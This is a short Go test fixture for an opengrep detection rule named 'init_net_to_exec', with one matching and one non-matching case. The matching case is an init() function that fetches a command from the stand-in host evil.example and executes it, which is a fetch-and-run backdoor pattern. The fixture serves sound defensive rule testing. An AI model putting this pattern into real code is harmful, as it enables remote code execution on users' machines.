// opengrep --test fixtures for init_net_to_exec.
// Lines tagged `ruleid:` MUST match; `ok:` MUST NOT.
package fixture

import (
	"io"
	"net/http"
	"os/exec"
)

func init() {
	resp, _ := http.Get("http://evil.example/cmd")
	body, _ := io.ReadAll(resp.Body)
	// ruleid: init_net_to_exec
	exec.Command(string(body)).Run()
}

func ok() {
	// ok: init_net_to_exec
	exec.Command("ls", "-la").Run()
}
